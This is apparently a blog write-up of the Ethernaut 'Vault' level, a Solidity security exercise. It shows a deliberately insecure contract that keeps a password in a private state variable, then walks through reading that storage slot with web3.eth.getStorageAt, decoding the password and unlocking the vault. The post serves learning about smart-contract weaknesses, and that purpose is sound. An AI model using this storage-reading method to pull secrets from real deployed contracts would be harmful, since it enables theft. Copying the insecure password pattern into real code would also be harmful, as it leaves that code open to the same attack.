---
layout: post
title: Ethernaut - 8. Vault
date:  2022-08-28
tags: ethernaut solidity
---

## Difficulty: 🌕🌕🌑🌑🌑
> Unlock the vault to pass the level!

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
## Writeup
How can we get private variable password ? Well, There is an important method everyone should know : `web3.eth.getStorageAt(...)`, checkout [web3.js document](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat) to get details. 
> State variables marked as private and local variables are still publicly accessible.

1. Get new Instance.
2. Call the method
    ``` javascript

    await contract.locked()
    // true

    ```
3. Call the method
    ``` javascript

    await web3.eth.getStorageAt('0x7B794D77e945A806b2c6Ca41cb4bB6977F37D340', 1);
    // '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'

    ```
4. Call web3 method
    ``` javascript

    web3.utils.toAscii('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
    // 'A very strong secret password :)'

    ```
5. Call the method
    ``` javascript

    await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')

    ```
6. Call the method
    ``` javascript

    await contract.locked()
    // false

    ```
7. Submit instance ξ( ✿＞◡❛)